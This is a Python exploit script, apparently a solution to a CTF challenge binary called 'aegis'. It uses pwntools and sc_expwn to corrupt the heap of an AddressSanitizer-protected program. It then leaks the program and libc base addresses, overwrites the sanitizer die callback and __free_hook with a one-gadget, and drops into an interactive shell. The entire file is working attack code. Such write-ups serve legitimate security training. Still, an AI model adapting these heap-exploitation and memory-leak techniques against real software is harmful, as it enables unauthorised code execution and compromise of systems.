#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './aegis'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so')
env.select()

#==========

binf = ELF(bin_file)
offset_cfi_check        = binf.sep_function['cfi_check']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

shadow = lambda x : (x >> 3) + 0x7fff8000

def attack(conn, **kwargs):
    pwn = aegis(conn)

    pwn.add(0x10, 'a'*0x8, -1)          # 0
    pwn.add(0x10, 'b'*0x7+'\n', 0)      # 1
    pwn.lucky(shadow(0x602000000020))

    pwn.update(0, 'X'*0x12, 0xffffffffffff)
    pwn.update(0, 'Y'*0x10+p64(0xffffff00000002), (0x800001ffffffff<<8) + 0x02)
    pwn.delete(0)

    pwn.add(0x10, 'c'*0x8, 0xffffffffffffff)          # 2
    pwn.addr_cfi_check  = u(pwn.leak(0x602000000018))
    binf.address        = pwn.addr_cfi_check - offset_cfi_check
    info('addr_bin_base     = 0x{:08x}'.format(binf.address))
    addr_got_main               = binf.got['__libc_start_main']
    addr_sanitizer_callback     = binf.symbols['_ZN11__sanitizerL15UserDieCallbackE']

    addr_libc_main      = u(pwn.leak(addr_got_main))
    libc.address        = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_free      = libc.sep_function['free']
    addr_libc_onegadget = libc.address + 0x4f322

    # pwn.overwrite(addr_sanitizer_callback, 0xdeadbeef)

    pwn.update(2, p64(addr_sanitizer_callback)[:-1]+'\n', pwn.addr_cfi_check)
    pwn.update(0, 'a', binf.sep_function['main'])

    pwn.update(2, p64(libc.symbols['__free_hook']), pwn.addr_cfi_check)
    pwn.update(0, 'a', addr_libc_onegadget)

    pwn.update(2, p64(addr_sanitizer_callback), pwn.addr_cfi_check)
    pwn.update(0, p64(addr_libc_free), 0)

    '''
    rop = ROP(binf)
    exploit  = p64(rop.ret.address)*0x50
    exploit += p64(rop.rdi.address)
    exploit += p64(addr_libc_str_sh)
    exploit += p64(addr_libc_system)
    conn.sendline(exploit)
    '''

class aegis:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter
        self.addr_cfi_check = offset_cfi_check

    def add(self, size, content, _id):
        self.sendlineafter('Choice: ', '1')
        self.sendlineafter('Size: ', str(size))
        self.sendafter('Content: ', content)
        self.sendlineafter('ID: ', str(_id))

    def show(self, idx):
        self.sendlineafter('Choice: ', '2')
        self.sendlineafter('Index: ', str(idx))
        self.recvuntil('Content: ')
        return self.recvuntil('\nID', drop=True)

    def update(self, idx, content, _id):
        self.sendlineafter('Choice: ', '3')
        self.sendlineafter('Index: ', str(idx))
        self.sendafter('Content: ', content)
        self.sendlineafter('ID: ', str(_id))

    def delete(self, idx):
        self.sendlineafter('Choice: ', '4')
        self.sendlineafter('Index: ', str(idx))

    def lucky(self, addr):
        self.sendlineafter('Choice: ', '666')
        self.sendlineafter('Number: ', str(addr))

    def leak(self, addr):
        addr = p64(addr)
        self.update(2, addr[:-1]+'\n', self.addr_cfi_check)
        data = self.show(0)
        self.update(2, 'X'*(addr.find('\x00')+1), -1)
        return data

    def overwrite(self, addr, value):
        orig = self.leak(addr)

        addr = p64(addr)
        self.update(2, addr[:-1]+'\n', self.addr_cfi_check)
        self.update(0, 'a'*(len(orig)+1), -1)
        self.update(0, p64(value)+'\n', 0)
        self.update(2, 'X'*(addr.find('\x00')+1), -1)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
